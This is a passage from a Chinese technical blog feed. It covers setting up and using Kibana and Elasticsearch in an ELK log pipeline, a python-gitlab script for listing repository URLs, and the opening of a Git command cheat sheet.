<h3 id="启动服务-4"><a href="#启动服务-4" class="headerlink" title="启动服务"></a><strong>启动服务</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup /opt/logstash/bin/logstash -f /opt/logstash/config/kafka_to_es.conf &amp;</span><br></pre></td></tr></table></figure>

<p><strong>数据转发层已经配置完成</strong></p>
<h2 id="修改ES的索引模版配置"><a href="#修改ES的索引模版配置" class="headerlink" title="修改ES的索引模版配置"></a><strong>修改ES的索引模版配置</strong></h2><p>为什么要做这一步呢？ 因为logstash写入数据到ES时，会自动选用一个索引模版。 我们可以看一下</p>
<p><img src="/articles/944dc498/3.png" alt="img"></p>
<p>这个模版其实也挺好，不过有一个参数，我标记出来了。 “refresh_interval”:”5s”  这个参数用于控制，索引的刷新频率。 索引的刷新频率越快，你搜索到的数据就实时。  这里是5秒。 一般我们日志场景不需要这么高的实时性。 可以适当降低该参数，提高ES 索引库的写入速度。  </p>
<p><strong>上传自定义模版</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -XPUT http://10.10.0.195:9200/_template/logstash2 -d '</span><br><span class="line">&#123;</span><br><span class="line">        "order":1,</span><br><span class="line">        "template":"logstash-*",</span><br><span class="line">        "settings":&#123;</span><br><span class="line">            "index":&#123;</span><br><span class="line">                "refresh_interval":"120s"</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        "mappings":&#123;</span><br><span class="line">            "_default_":&#123;</span><br><span class="line">                "_all":&#123;</span><br><span class="line">                    "enabled":false</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;'</span><br></pre></td></tr></table></figure>

<p>由于这个自定义模版，我把优先级 order 定义的比logstash模版高，而模版的匹配规则又一样，所以这个自定义模版的配置会覆盖原logstash模版。</p>
<p>我这里只是简单描述。 如果要详细理解其中道理，请查看我的 ES 调优篇。</p>
<h2 id="配置-Kibana-数据展示层"><a href="#配置-Kibana-数据展示层" class="headerlink" title="配置 Kibana 数据展示层"></a><strong>配置 Kibana 数据展示层</strong></h2><p>10.10.0.195 节点</p>
<p>Kibana是ELK套件中的一员，也属于elasticsearch 公司，在官网提供下载。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xzvf kibana-6.2.2-linux-x86_64.tar.gz -C /opt/</span><br><span class="line">mv /opt/kibana-6.2.2-linux-x86_64 /opt/kibana</span><br></pre></td></tr></table></figure>

<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a><strong>修改配置文件</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /opt/kibana/config/kibana.yml</span></span><br><span class="line"> </span><br><span class="line">server.port: 5601</span><br><span class="line">server.host: 0.0.0.0</span><br><span class="line">elasticsearch.url: "http://10.10.0.195:9200"</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改这三个参数就好了</span></span><br></pre></td></tr></table></figure>

<h3 id="启动服务-5"><a href="#启动服务-5" class="headerlink" title="启动服务"></a><strong>启动服务</strong></h3><p><img src="/articles/944dc498/4.png" alt></p>
<p>打开浏览器访问: <a href="http://10.10.0.195:5601/" target="_blank" rel="noopener">http://10.10.0.195:5601/</a></p>
<h2 id="kibana"><a href="#kibana" class="headerlink" title="kibana"></a><strong>kibana</strong></h2><p>Kibana是一个开源的分析和可视化平台，设计用于和Elasticsearch一起工作。</p>
<p>你用Kibana来搜索，查看，并和存储在Elasticsearch索引中的数据进行交互。</p>
<p>你可以轻松地执行高级数据分析，并且以各种图标、表格和地图的形式可视化数据。</p>
<p>Kibana使得理解大量数据变得很容易。它简单的、基于浏览器的界面使你能够快速创建和共享动态仪表板，实时显示Elasticsearch查询的变化。</p>
<h3 id="安装Kibana"><a href="#安装Kibana" class="headerlink" title="安装Kibana"></a><strong>安装Kibana</strong></h3><hr>
<p> <img src="/articles/944dc498/5.png" alt="img"></p>
<p><img src="/articles/944dc498/6.png" alt></p>
<h3 id="Kibana配置"><a href="#Kibana配置" class="headerlink" title="Kibana配置"></a><strong>Kibana配置</strong></h3><hr>
<p> <a href="https://www.elastic.co/guide/en/kibana/current/settings.html" target="_blank" rel="noopener">官网文档</a></p>
<p> <strong>访问Kibana</strong></p>
<hr>
<p> Kibana是一个Web应用程序，你可以通过5601来访问它。例如：localhost:5601 或者 <a href="http://YOURDOMAIN.com:5601" target="_blank" rel="noopener">http://YOURDOMAIN.com:5601</a></p>
<p>当访问Kibana时，默认情况下，Discover页面加载时选择了默认索引模式。时间过滤器设置为最近15分钟，搜索查询设置为match-all(*)</p>
<h3 id="检查Kibana状态"><a href="#检查Kibana状态" class="headerlink" title="检查Kibana状态"></a><strong>检查Kibana状态</strong></h3><p><a href="http://localhost:5601/status" target="_blank" rel="noopener">http://localhost:5601/status</a></p>
<p><img src="/articles/944dc498/7.png" alt="img"></p>
<p>或者 <a href="http://192.168.101.5:5601/api/status" target="_blank" rel="noopener">http://192.168.101.5:5601/api/status</a> 返回JSON格式状态信息</p>
<h3 id="用Elasticsearch连接到Kibana"><a href="#用Elasticsearch连接到Kibana" class="headerlink" title="用Elasticsearch连接到Kibana"></a><strong>用Elasticsearch连接到Kibana</strong></h3><hr>
<p> 在你开始用Kibana之前，你需要告诉Kibana你想探索哪个Elasticsearch索引。第一次访问Kibana是，系统会提示你定义一个索引模式以匹配一个或多个索引的名字。</p>
<p>（提示：默认情况下，Kibana连接允许在localhost上的Elasticsearch实例。为了连接到一个不同的Elasticsearch实例，修改kabana.yml中Elasticsearch的URL，然后重启Kibana。）</p>
<p>为了配置你想要用Kibana访问的Elasticsearch索引：</p>
<p>　　1、访问Kibana UI。例如，localhost:56011 或者 <a href="http://YOURDOMAIN.com:5601" target="_blank" rel="noopener">http://YOURDOMAIN.com:5601</a></p>
<p>　　2、指定一个索引模式来匹配一个或多个你的Elasticsearch索引。当你指定了你的索引模式以后，任何匹配到的索引都将被展示出来。</p>
<p>　　（画外音：*匹配0个或多个字符；  指定索引默认是为了匹配索引，确切的说是匹配索引名字）</p>
<p>　　3、点击“<strong>Next Step</strong>”以选择你想要用来执行基于时间比较的包含timestamp字段的索引。如果你的索引没有基于时间的数据，那么选择“<strong>I don’t want to use the Time Filter</strong>”选项。</p>
<p>　　4、点击“<strong>Create index pattern</strong>”按钮来添加索引模式。第一个索引模式自动配置为默认的索引默认，以后当你有多个索引模式的时候，你就可以选择将哪一个设为默认。（提示：Management &gt; Index Patterns）</p>
<p><img src="/articles/944dc498/8.png" alt="img"></p>
<p><img src="/articles/944dc498/9.png" alt="img"></p>
<p><img src="/articles/944dc498/10.png" alt="img"></p>
<p>现在，Kibana已经连接到你的Elasticsearch数据。Kibana展示了一个只读的字段列表，这些字段是匹配到的这个索引配置的字段。</p>
<h2 id="使用说明之Discover"><a href="#使用说明之Discover" class="headerlink" title="使用说明之Discover"></a>使用说明之Discover</h2><hr>
<p>你可以从Discover页面交互式的探索你的数据。你可以访问与所选择的索引默认匹配的每个索引中的每个文档。你可以提交查询请求，过滤搜索结构，并查看文档数据。你也可以看到匹配查询请求的文档数量，以及字段值统计信息。如果你选择的索引模式配置了time字段，则文档随时间的分布将显示在页面顶部的直方图中。</p>
<p><img src="/articles/944dc498/11.png" alt="img"></p>
<p><img src="/articles/944dc498/12.png" alt="img"></p>
<h3 id="设置时间过滤"><a href="#设置时间过滤" class="headerlink" title="设置时间过滤"></a><strong>设置时间过滤</strong></h3><p><img src="/articles/944dc498/13.png" alt="img"></p>
<p><img src="/articles/944dc498/14.png" alt="img"></p>
<p><img src="/articles/944dc498/15.png" alt="img"></p>
<h3 id="搜索数据"><a href="#搜索数据" class="headerlink" title="搜索数据"></a>搜索数据</h3><p>你可以在搜索框中输入查询条件来查询当前索引模式匹配的索引。在查询的时候，你可以使用Kibana标准的查询语言（基于Lucene的查询语法）或者完全基于JSON的Elasticsearch查询语言DSL。Kibana查询语言可以使用自动完成和简化的查询语法作为实验特性，您可以在查询栏的“选项”菜单下进行选择。</p>
<p>当你提交一个查询请求时，直方图、文档表和字段列表都会更新，以反映搜索结果。命中（匹配到的文档）总数会显示在工具栏中。文档表格中显示了前500个命中。默认情况下，按时间倒序排列，首先显示最新的文档。你可以通过点击“Time”列来逆转排序顺序。</p>
<p><img src="/articles/944dc498/16.png" alt="img"></p>
<p><img src="/articles/944dc498/17.png" alt="img"></p>
<h3 id="Lucene查询语法"><a href="#Lucene查询语法" class="headerlink" title="Lucene查询语法"></a><strong>Lucene查询语法</strong></h3><p>Kibana查询语言基于Lucene查询语法。下面是一些提示，可能会帮到你：</p>
<ul>
<li>为了执行一个文本搜索，可以简单的输入一个文本字符串。例如，如果你想搜索web服务器的日志，你可以输入关键字”<strong>safari</strong>“，这样你就可以搜索到所有有关”safari”的字段</li>
<li>为了搜索一个特定字段的特定值，可以用字段的名称作为前缀。例如，你输入”<strong>status:200</strong>“，将会找到所有status字段的值是200的文档</li>
<li>为了搜索一个范围值，你可以用括号范围语法，<strong>[START_VALUE TO END_VALUE]</strong>。例如，为了找到状态码是4xx的文档，你可以输入<strong>status:[400 TO 499]</strong></li>
<li>为了指定更改复杂的查询条件，你可以用布尔操作符 <strong>AND</strong> , <strong>OR</strong> , 和 <strong>NOT</strong>。例如，为了找到状态码是4xx并且extension字段是php或者html的文档，你可以输入<strong>status:[400 TO 499] AND (extension:php OR extension:html)</strong></li>
</ul>
<p><img src="/articles/944dc498/18.png" alt="img"></p>
<p><img src="/articles/944dc498/19.png" alt="img"></p>
<p><img src="/articles/944dc498/20.png" alt="img"></p>
<h3 id="Kibana查询语法增强"><a href="#Kibana查询语法增强" class="headerlink" title="Kibana查询语法增强"></a><strong>Kibana查询语法增强</strong></h3><p><strong>新的更简单的语法</strong></p>
<p>如果你熟悉Kibana的旧Lucene查询语法，那么你应该对这种新的语法也不会陌生。基本原理保持不变，我们只是简单地改进了一些东西，使查询语言更易于使用。</p>
<p>response:200 将匹配response字段的值是200的文档</p>
<p>用引号引起来的一段字符串叫短语搜索。例如，message:”Quick brown fox”  将在message字段中搜索”quick brown fox”这个短语。如果没有引号，将会匹配到包含这些词的所有文档，而不管它们的顺序如何。这就意味着，会匹配到”Quick brown fox”，而不会匹配”quick fox brown”。（画外音：引号引起来作为一个整体）</p>
<p>查询解析器将不再基于空格进行分割。多个搜索项必须由明确的布尔运算符分隔。注意，布尔运算符不区分大小写。</p>
<p>在Lucene中，response:200 extension:php 等价于 response:200 and extension:php。这将匹配response字段值匹配200并且extenion字段值匹配php的文档。</p>
<p>如果我们把中间换成or，那么response:200 or extension:php将匹配response字段匹配200 或者 extension字段匹配php的文档。</p>
<p>默认情况下，and 比 or 具有更高优先级。</p>
<p>response:200 and extension:php or extension:css 将匹配response是200并且extension是php，或者匹配extension是css而response任意</p>
<p>括号可以改变这种优先级</p>
<p>response:200 and (extension:php or extension:css) 将匹配response是200并且extension是php或者css的文档</p>
<p>还有一种简写的方式：</p>
<p>response:(200 or 404) 将匹配response字段是200或404的文档。字符值也可以是多个，比如：tags:(success and info and security)</p>
<p>还可以用not</p>
<p>not response:200 将匹配response不是200的文档</p>
<p>response:200 and not (extension:php or extension:css) 将匹配response是200并且extension不是php也不是css的文档</p>
<p>范围检索和Lucene有一点点不同</p>
<p>代替 byte:&gt;1000，我们用byte &gt; 1000</p>
<p>&gt;, &gt;=, &lt;, &lt;= 都是有效的操作符</p>
<p>response:*  将匹配所有存在response字段的文档</p>
<p>通配符查询也是可以的。machine.os:win* 将匹配machine.os字段以win开头的文档，像”windows 7”和”windows 10”这样的值都会被匹配到。</p>
<p>通配符也允许我们一次搜索多个字段，例如，假设我们有machine.os和machine.os.keyword两个字段，我们想要搜索这两个字段都有”windows 10”，那么我们可以这样写”machine.os*:windows 10”</p>
<h3 id="刷新搜索结果"><a href="#刷新搜索结果" class="headerlink" title="刷新搜索结果"></a><strong>刷新搜索结果</strong></h3><p><img src="/articles/944dc498/21.png" alt="img"></p>
<h3 id="按字段过滤"><a href="#按字段过滤" class="headerlink" title="按字段过滤"></a><strong>按字段过滤</strong></h3><p><img src="/articles/944dc498/22.png" alt="img"></p>
<p><img src="/articles/944dc498/23.png" alt="img"></p>
<p>以上是控制列表显示哪些字段，还有一种方式是在查看文档数据的时候点那个像书一样的小图标</p>
<p><img src="/articles/944dc498/24.png" alt="img"></p>
<p>删除也是可以的</p>
<p><img src="/articles/944dc498/25.png" alt="img"></p>
<p>我们还可以编辑一个DSL查询语句，用于过滤筛选，例如</p>
<p><img src="/articles/944dc498/26.png" alt="img"></p>
<h3 id="查看文档数据"><a href="#查看文档数据" class="headerlink" title="查看文档数据"></a><strong>查看文档数据</strong></h3><p><img src="/articles/944dc498/27.png" alt="img"></p>
<p><img src="/articles/944dc498/28.png" alt="img"></p>
<h3 id="查看文档上下文"><a href="#查看文档上下文" class="headerlink" title="查看文档上下文"></a><strong>查看文档上下文</strong></h3><p><img src="/articles/944dc498/29.png" alt="img"></p>
<p><img src="/articles/944dc498/30.png" alt="img"></p>
<h3 id="查看字段数据统计"><a href="#查看字段数据统计" class="headerlink" title="查看字段数据统计"></a><strong>查看字段数据统计</strong></h3><p><img src="/articles/944dc498/31.png" alt="img">)<img src="/articles/944dc498/32.png" alt="img"></p>
<h2 id="使用说明之Visualize"><a href="#使用说明之Visualize" class="headerlink" title="使用说明之Visualize"></a><strong>使用说明之Visualize</strong></h2><hr>
<p> Visualize使得你可以创建在你的Elasticsearch索引中的数据的可视化效果。然后，你可以构建dashboard来展示相关可视化。</p>
<p>Kibana可视化是基于Elasticsearch查询的。通过用一系列的Elasticsearch聚集来提取并处理你的数据，你可以创建图片来线上你需要了解的趋势、峰值和低点。</p>
<h3 id="创建一个可视化"><a href="#创建一个可视化" class="headerlink" title="创建一个可视化"></a><strong>创建一个可视化</strong></h3><p>为了创建一个可视化的视图：</p>
<p>第1步：点击左侧导航条中的“<strong>Visualize</strong>”按钮</p>
<p>第2步：点击“Create new visualization”按钮或者<strong>加号(+)</strong>按钮</p>
<p>第3步：选择一个可视化类型</p>
<p>第4步：指定一个搜索查询来检索可视化数据</p>
<p>第5步：在可视化的构建器中选择Y轴的聚合操作。例如，sum，average，count等等</p>
<p>第6步：设置X轴</p>
<p>例如：</p>
<p><img src="/articles/944dc498/33.png" alt="img"></p>
<p><img src="/articles/944dc498/34.png" alt="img"></p>
<p><img src="/articles/944dc498/35.png" alt="img"></p>
<p><img src="/articles/944dc498/36.png" alt="img"></p>
<p>更多请看这里</p>
<p><a href="https://www.elastic.co/guide/en/kibana/current/createvis.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/kibana/current/createvis.html</a></p>
<p><a href="https://www.elastic.co/guide/en/kibana/current/xy-chart.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/kibana/current/xy-chart.html</a></p>
<p><a href="https://www.elastic.co/guide/en/kibana/current/visualize.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/kibana/current/visualize.html</a></p>
<h2 id="使用说明之Dashboard"><a href="#使用说明之Dashboard" class="headerlink" title="使用说明之Dashboard"></a><strong>使用说明之Dashboard</strong></h2><hr>
<p> Kibana仪表板显示可视化和搜索的集合。你可以安排、调整和编辑仪表板内容，然后保存仪表板以便共享它。</p>
<h3 id="构建一个Dashboard"><a href="#构建一个Dashboard" class="headerlink" title="构建一个Dashboard"></a><strong>构建一个Dashboard</strong></h3><p>第1步：在导航条上点击“<strong>Dashboard</strong>”</p>
<p>第2步：点击“Create new dashboard”或者“加号(+)”按钮</p>
<p>第3步：点击“Add”按钮</p>
<p>第4步：为了添加一个可视化，从可视化列表中选择一个，或者点击“Add new visualization”按钮新创建一个</p>
<p>第5步：为了添加一个已保存的查询，点击“Saved Search”选项卡，然后从列表中选择一个</p>
<p>第6步：当你完成添加并且调整了dashboard的内容后，去顶部菜单栏，点击“Save”，然后输入一个名字。</p>
<p>默认情况下，Kibana仪表板使用浅色主题。要使用深色主题，单击“选项”并选择“使用深色主题”。要将dark主题设置为默认，请转到管理&gt;Management &gt; Advanced ，并将dashboard:defaultDarkTheme设置为On。</p>
<p><img src="/articles/944dc498/37.png" alt="img"></p>
<p><img src="/articles/944dc498/38.png" alt="img"></p>
<p><img src="/articles/944dc498/39.png" alt="img"></p>
<h2 id="使用说明之Monitoring"><a href="#使用说明之Monitoring" class="headerlink" title="使用说明之Monitoring"></a><strong>使用说明之Monitoring</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Elasticsearch控制台打印日志</span><br><span class="line">[2018-08-15T14:48:26,874][INFO ][o.e.c.m.MetaDataCreateIndexService] [Px524Ts] [.monitoring-kibana-6-2018.08.15] creating index, cause [auto(bulk api)], templates [.monitoring-kibana], shards [1]/[0], mappings [doc]</span><br><span class="line"></span><br><span class="line">Kibana控制台打印日志</span><br><span class="line">log   [03:26:53.605] [info][license][xpack] Imported license information from Elasticsearch for the [monitoring] cluster: mode: basic | status: active</span><br></pre></td></tr></table></figure>

<p><img src="/articles/944dc498/40.png" alt="img"></p>
<p><img src="/articles/944dc498/41.png" alt="img"></p>
<p><img src="/articles/944dc498/42.png" alt="img"></p>
<p><img src="/articles/944dc498/43.png" alt="img"></p>
<p><img src="/articles/944dc498/44.png" alt="img"></p>
<p><a href="https://www.elastic.co/guide/en/kibana/current/elasticsearch-metrics.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/kibana/current/elasticsearch-metrics.html</a></p>
<h2 id="数据展示"><a href="#数据展示" class="headerlink" title="数据展示"></a><strong>数据展示</strong></h2><p><img src="/articles/944dc498/45.png" alt="img"></p>
<h2 id="经验心得"><a href="#经验心得" class="headerlink" title="经验心得"></a>经验心得</h2><h3 id="验证filebeat是否取得数据"><a href="#验证filebeat是否取得数据" class="headerlink" title="验证filebeat是否取得数据"></a><strong>验证filebeat是否取得数据</strong></h3><p>把配置中，output配置打开，根据启动日志，看是否有数据进入</p>
<p><img src="/articles/944dc498/46.png" alt="img"></p>
<h3 id="验证logstash是否取得数据"><a href="#验证logstash是否取得数据" class="headerlink" title="验证logstash是否取得数据"></a><strong>验证logstash是否取得数据</strong></h3><p>把配置中，output 中stdout注释打开，并暂时把kafka或es注释掉，重启logstash，根据启动日志，看是否有数据进入</p>
<p><img src="/articles/944dc498/47.png" alt="img"></p>
<h3 id="验证kafka是否取得数据"><a href="#验证kafka是否取得数据" class="headerlink" title="验证kafka是否取得数据"></a><strong>验证kafka是否取得数据</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看kafka  topic列表</span></span><br><span class="line">/opt/kafka/bin/kafka-topics.sh --list --zookeeper localhost:2181</span><br><span class="line"><span class="meta">#</span><span class="bash">根据topic列表检查是否有数据流入</span></span><br><span class="line">/opt/kafka/bin/kafka-console-consumer.sh  --zookeeper localhost:2181 --topic nginxlog --from-beginning</span><br></pre></td></tr></table></figure>

<p><img src="/articles/944dc498/48.png" alt="img"></p>
<h3 id="验证es是否有数据存入数据"><a href="#验证es是否有数据存入数据" class="headerlink" title="验证es是否有数据存入数据"></a><strong>验证es是否有数据存入数据</strong></h3><p><strong>通过web页面或命令查看集群状态：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">常用命令</span></span><br><span class="line">curl -XGET 'localhost:9200/_cat/indices?v&amp;pretty' #查看索引</span><br><span class="line">curl -XGET 'localhost:9200/_cat/nodes?v&amp;pretty' #查看节点状态</span><br><span class="line">curl -XGET http://localhost:9200/_cluster/health?pretty   #查看集群状态</span><br><span class="line">curl -XGET http://localhost:9200/_all  #查看所有索引信息</span><br><span class="line">curl -XDELETE 'http://localhost:9200/twitter,fgfg,ghjg/' #删除一个或多个索引 中间用，隔开 _all表示删除所有，并支持通配符*</span><br><span class="line">curl -XGET 'http://localhost:9200/twitter/_settings,_mappings' #支持参数 The available features are _settings, _mappings, _warmers and _aliases.</span><br><span class="line"></span><br><span class="line">es增删改查</span><br><span class="line">创建一个新的索引test，设置分片数为1，通过mapping初始化一个type1,type1有一个属性field1</span><br><span class="line">curl -XPUT http://localhost:9200/test -d'</span><br><span class="line">&#123;</span><br><span class="line">    "settings" : &#123;</span><br><span class="line">        "number_of_shards" : 1</span><br><span class="line">    &#125;,</span><br><span class="line">    "mappings" : &#123;</span><br><span class="line">        "type1" : &#123;</span><br><span class="line">            "properties" : &#123;</span><br><span class="line">                "field1" : &#123; "type" : "text" &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;'</span><br><span class="line">删除索引twitter</span><br><span class="line">curl -XDELETE 'http://localhost:9200/twitter</span><br><span class="line"></span><br><span class="line">查看索引</span><br><span class="line">curl -XGET 'localhost:9200/_cat/indices?v&amp;pretty'</span><br><span class="line"></span><br><span class="line">更新索引</span><br><span class="line">可以局部更新，新增字段等等</span><br><span class="line">curl -XPOST localhost:9200/索引名称/字段名/id/_update -d</span><br><span class="line">'&#123;</span><br><span class="line">  "doc": &#123; "name": "Jane Doe",'age':'30' &#125;</span><br><span class="line">&#125;'</span><br><span class="line"></span><br><span class="line">curl -u username:password -XGET '172.18.238.3:9200/_cat/indices?v&amp;pretty'</span><br></pre></td></tr></table></figure>

<p><img src="/articles/944dc498/49.png" alt="img"></p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Elk</tag>
      </tags>
  </entry>
  <entry>
    <title>python操作gitlab API接口</title>
    <url>/articles/79cf2ce7.html</url>
    <content><![CDATA[<p>使用 <code>python-gitlab</code> 模块来调用gitlab的API来管理和操作gitlab。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://python-gitlab.readthedocs.io/en/stable/" target="_blank" rel="noopener">官方文档</a></p>
<a id="more"></a>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install python-gitlab</span><br><span class="line"># 如果是安装到Python3使用可以使用如下命令</span><br><span class="line">pip3 install python-gitlab</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>为了保护API 用到的 private_token，一般会将其写到系统的配置文件中去<br><code>/etc/python-gitlab.cfg</code> 或者 <code>~/.python-gitlab.cfg</code></p>
<p>配置示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.python-gitlab.cfg</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">default = sun</span><br><span class="line">ssh_verify = False</span><br><span class="line">timeout = 8</span><br><span class="line"></span><br><span class="line">[sun]</span><br><span class="line">url = http://10.0.0.6</span><br><span class="line">private_token = xxxxx-V4Yxxxxxxks7u</span><br><span class="line">api_version = 3</span><br></pre></td></tr></table></figure>

<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>在程序中使用的时候可以直接用如下方式调用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># login</span></span></span><br><span class="line">gl = gitlab.Gitlab.from_config('sun', ['~/.python-gitlab.cfg'])</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 得到第一页project列表</span></span></span><br><span class="line">projects = gl.projects.list()</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 得到所有project</span></span></span><br><span class="line">projects = gl.projects.list(all=True)</span><br><span class="line">projects = gl.projects.all()</span><br></pre></td></tr></table></figure>

<h2 id="附件脚本"><a href="#附件脚本" class="headerlink" title="附件脚本"></a>附件脚本</h2><p>自定义脚本获取指定用户或者分组或者全部的代码仓库地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line">__Author__ = <span class="string">'Sun'</span></span><br><span class="line">__Date__ = <span class="string">'2019--6-10'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gitlab</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GitlabAPI</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">'/etc/python-gitlab.cfg'</span>):</span><br><span class="line">            self.gl = gitlab.Gitlab.from_config(<span class="string">'sun'</span>, [<span class="string">'/etc/python-gitlab.cfg'</span>])</span><br><span class="line">        <span class="keyword">elif</span> os.path.exists(os.getenv(<span class="string">'HOME'</span>) + <span class="string">'/.python-gitlab.cfg'</span>):</span><br><span class="line">            self.gl = gitlab.Gitlab.from_config(<span class="string">'kaishugit'</span>, [os.getenv(<span class="string">'HOME'</span>) + <span class="string">'/.python-gitlab.cfg'</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'You need to make sure there is a file named "/etc/python-gitlab.cfg" or "~/.python-gitlab.cfg"'</span>)</span><br><span class="line">            sys.exit(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_user_id</span><span class="params">(self, username)</span>:</span></span><br><span class="line">        user = self.gl.users.get_by_username(username)</span><br><span class="line">        <span class="keyword">return</span> user.id</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_group_id</span><span class="params">(self, groupname)</span>:</span></span><br><span class="line">        group = self.gl.users.search(groupname)</span><br><span class="line">        <span class="keyword">return</span> group[<span class="number">0</span>].id</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all_projects</span><span class="params">(self)</span>:</span></span><br><span class="line">        projects = self.gl.projects.list(all=<span class="literal">True</span>)</span><br><span class="line">        result_list = []</span><br><span class="line">        <span class="keyword">for</span> project <span class="keyword">in</span> projects:</span><br><span class="line">            result_list.append(project.http_url_to_repo)</span><br><span class="line">        <span class="keyword">return</span> result_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_user_projects</span><span class="params">(self, userid)</span>:</span></span><br><span class="line">        projects = self.gl.projects.owned(userid=userid, all=<span class="literal">True</span>)</span><br><span class="line">        result_list = []</span><br><span class="line">        <span class="keyword">for</span> project <span class="keyword">in</span> projects:</span><br><span class="line">            result_list.append(project.http_url_to_repo)</span><br><span class="line">        <span class="keyword">return</span> result_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_group_projects</span><span class="params">(self, groupname)</span>:</span></span><br><span class="line">        projects = self.gl.projects.owned(groupname=groupname, all=<span class="literal">True</span>)</span><br><span class="line">        result_list = []</span><br><span class="line">        <span class="keyword">for</span> project <span class="keyword">in</span> projects:</span><br><span class="line">            result_list.append(project.http_url_to_repo)</span><br><span class="line">        <span class="keyword">return</span> result_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    git = GitlabAPI()</span><br><span class="line">    userprojects = git.get_user_projects()</span><br><span class="line">    print(userprojects)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>编程积累</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Git命令汇总</title>
    <url>/articles/6581af91.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>对常用的git命令进行汇总和注释，在使用时如需查询可更高效的查询到。</p>
<a id="more"></a>

<h2 id="Git命令"><a href="#Git命令" class="headerlink" title="Git命令"></a>Git命令</h2><p><strong>查看、添加、提交、删除、找回，重置修改文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git help &lt;command&gt; # 显示command的help</span><br><span class="line"></span><br><span class="line">git show # 显示某次提交的内容 git show $id</span><br><span class="line"></span><br><span class="line">git co -- &lt;file&gt; # 抛弃工作区修改</span><br><span class="line"></span><br><span class="line">git co . # 抛弃工作区修改</span><br><span class="line"></span><br><span class="line">git add &lt;file&gt; # 将工作文件修改提交到本地暂存区</span><br><span class="line"></span><br><span class="line">git add . # 将所有修改过的工作文件提交暂存区</span><br><span class="line"></span><br><span class="line">git rm &lt;file&gt; # 从版本库中删除文件</span><br><span class="line"></span><br><span class="line">git rm &lt;file&gt; --cached # 从版本库中删除文件，但不删除文件</span><br><span class="line"></span><br><span class="line">git reset &lt;file&gt; # 从暂存区恢复到工作文件</span><br><span class="line"></span><br><span class="line">git reset -- . # 从暂存区恢复到工作文件</span><br><span class="line"></span><br><span class="line">git reset --hard # 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改</span><br><span class="line"></span><br><span class="line">git ci &lt;file&gt; git ci . git ci -a # 将git add, git rm和git ci等操作都合并在一起做　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　git ci -am "some comments"</span><br><span class="line"></span><br><span class="line">git ci --amend # 修改最后一次提交记录</span><br><span class="line"></span><br><span class="line">git revert &lt;$id&gt; # 恢复某次提交的状态，恢复动作本身也创建次提交对象</span><br><span class="line"></span><br><span class="line">git revert HEAD # 恢复最后一次提交的状态</span><br></pre></td></tr></table></figure>

<p><strong>查看文件diff</strong></p>
